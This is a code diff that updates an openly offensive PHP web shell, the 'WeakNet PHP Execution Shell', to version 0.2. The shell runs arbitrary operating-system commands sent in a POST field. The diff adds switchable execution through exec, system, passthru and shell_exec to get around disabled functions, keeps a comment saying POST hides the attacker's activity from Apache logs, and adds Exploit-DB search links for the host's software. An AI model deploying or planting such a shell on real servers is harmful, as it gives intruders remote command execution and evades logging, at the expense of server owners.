@@ -4,6 +4,8 @@
 	WeakNet PHP Execution Shell - Post-exploitation shell for convenience
 	with navigation, and file content showing capabilities
 
+	version 0.2
+
 	2015 - Written by Douglas WeakNetLabs@Gmail.com
 -->
 <head>
@@ -35,6 +37,7 @@
 		padding:10px;
 		border:2px solid #2e2e2e;
 		float:left;
+		margin:5px 0px 0px 0px;
 	}
 	.titleBar{ /* this parent div is positioned */
 		position:fixed; 
@@ -83,10 +86,18 @@
 		float:right;
 		font-size:15px;
 		margin-right:20px;
+		height:40px; /* because of padding t,b of inputCMD */
 	}
 	a{ /* why can't this be non hideous by default? */
 		text-decoration:none;
 		color:#729fcf;
+
+	}
+	a:hover{
+		text-decoration:underline; /* to differentiate, i guess */
+	}
+	.radioText{ /* for the radio buttons, choosing execType above the inputCMD input bar */
+		font-size:12px;
 	}
 	/* these are for styling the tbale output of the .serverInfo box: */
 	tr:nth-child(even) {background: #202020}
@@ -103,6 +114,9 @@
 		}
 		document.getElementById("submitCmd").submit(); // submit the request
 	}
+	function execType(type){
+		document.getElementById('execType').value=type; // Just set the type here and the PHP POST will pick it up
+	}
 </script>
 </head>
 <body>
@@ -111,11 +125,20 @@
 	if ($cmd == "") { # initial hit to the page
 		$cmd = "(none) Please type a command to execute below";
 	}else{
-		exec("$cmd", $results); # a command, let's execute it on the host
-		echo "<div class=\"titleBar\"><div class=\"title\"><div class=\"titleCenter\"><span style=\"font-size:35px;\">&#128026;</span> Results for command: ".
+		if($_POST['execType'] == "exec"){ 
+			exec("$cmd 2>/dev/stdout",$results); # a command, let's execute it on the host
+		}elseif($_POST['execType'] == "system"){ 
+			system("$cmd 2>/dev/stdout",$results); # use system() in case exec() was disabled in PHP.ini
+		}elseif($_POST['execType'] == "passthru"){
+			passthru("$cmd 2>/dev/stdout",$results); # use passthru for command execution/injection
+		}elseif($_POST['execType'] =="shell_exec"){
+			$results = shell_exec("$cmd 2>/dev/stdout"); # use shell_exec (similar to backtick operators, or $() in Bash)
+		}
+		echo "<div class=\"titleBar\"><div class=\"title\"><div class=\"titleCenter\"><span style=\"font-size:35px;\">&#128026; WPES</span> Results for command: ".
 			" <span class=\"cmdTitle\">".$cmd."</span></div></div></div>";
 	}
 ?>
+<!-- This is where the outpu of the command goes -->
 <div class="output">
 <?php
 	foreach(array_slice($results,1,count($results)) as $output) { # let's format the output, in case it contains HTML characters:
@@ -140,21 +163,43 @@
 	}
 ?>
 </div>
+<!-- The input box and whole bottom bar -->
 <div class="inputCMD">
+		<span class"radioText">
+	<strong>PHP Exec Function: </strong> 
+		<a href="http://php.net/manual/en/function.exec.php">exec()</a><input type="radio" <?php if(!$_POST['execType']){echo "checked"; }else{if($_POST['execType'] == "exec"){echo "checked";} } ?> 
+			name="execType" value="exec" onClick="execType('exec')"/> 
+		<a href="http://php.net/manual/en/function.system.php">system()</a><input onClick="execType('system')" <?php if($_POST['execType']){if($_POST['execType'] == "system"){echo "checked";} } ?> 
+			type="radio" name="execType" value="system" /> 
+		<a href="http://php.net/manual/en/function.passthru.php">passthru()</a><input onClick="execType('passthru')" <?php if($_POST['execType']){if($_POST['execType'] == "passthru"){echo "checked";} } ?>
+			type="radio" name="execType" value="passthru" />
+		<a href="http://php.net/manual/en/function.shell-exec.php">shell_exec()</a><input onClick="execType('shell_exec')" <?php if($_POST['execType']){if($_POST['execType'] == "shell_exec"){echo "checked";} } ?>
+			type="radio" name="execType" value="shell_exec" /><br />
+		</span>
 	<form action="#" method="post" name="submitCmd" id="submitCmd"><!-- no button here, just hit enter -->
 		<input id="inputCmd" type="text" size="55" placeholder="Type command here to execute on host and hit return" name="cmd"/>
+		<input type="hidden" value="<?php if($_POST['execType'] != ""){echo $_POST['execType'];}else{echo "exec";} ?>" name="execType" id="execType"/>
 	</form><!-- went with POST method to slightly obfuscate the attacker's activity from simple Apache logs -->
+<!-- The band name on the bottom left -->
 <div class="branding">
 	<a href="https://github.com/weaknetlabs/wpes">&#128026; WPES WeakNet Labs</a>
 </div>
+<!-- The Server info box -->
 <div class="serverInfo">
 	<table>
 		<tr><strong style="font-size:16px;">Remote Server Information</strong></tr>
-		<tr><td>&#128225;</td><td>IP</td><td><?php echo $_SERVER['SERVER_ADDR'] ?></td</tr>
-		<tr><td>&#128225;</td><td>Hostname</td><td><?php echo $_SERVER['SERVER_NAME']; ?></td</tr>
-		<tr><td>&#128225;</td><td>Software</td><td><?php echo $_SERVER['SERVER_SOFTWARE']; ?></td</tr>
+		<tr><td>&#128225;</td><td>IP</td><td><?php echo "<a title=\"Check ARIN database for this IP address information.\" target=\"_blank\" href=\"http://whois.arin.net/rest/nets;q=".$_SERVER['SERVER_ADDR']
+			."?showDetails=true&showARIN=false&showNonArinTopLevelNet=false&ext=netref2\">"
+			.$_SERVER['SERVER_ADDR']."</a>"; ?>
+		</td</tr>
+		<?php # let's create an exploit-db search link
+			$software = preg_replace("/\//","%20",$_SERVER['SERVER_SOFTWARE']); # get rid of fwd slashes
+			$software = preg_replace("/\([^)]+\)/","",$software); # get rid of OS version
+		?>
+		<tr><td>&#128225;</td><td>Hostname</td><td><?php echo "<a target=\"blank\" href=\"https://www.google.com/?gws_rd=ssl#q=site:".$_SERVER['SERVER_NAME']."\">".$_SERVER['SERVER_NAME']."</a>"; ?></td</tr>
+		<tr><td>&#128225;</td><td>Software</td><td><?php echo "<a target=\"blank\" title=\"Check for exploits for this software using Exploit-DB.\" href=\"https://www.exploit-db.com/search/?action=search&description=".$software."&e_author=\">".$_SERVER['SERVER_SOFTWARE']."</a>"; ?></td</tr>
 		<tr><td>&#128225;</td><td>Timestamp</td><td><?php echo $_SERVER['REQUEST_TIME']; ?></td</tr>
-		<tr><td>&#128225;</td><td>Admin</td><td><?php echo $_SERVER['SERVER_ADMIN']; ?></td</tr>
+		<tr><td>&#128225;</td><td>Admin</td><td><?php echo "<a target=\"_blank\" title=\"Email administrator.\" href=\"mailto:".$_SERVER['SERVER_ADMIN']."\">".$_SERVER['SERVER_ADMIN']."</a>" ?></td</tr>
 	</table>
 </div>
 </body>
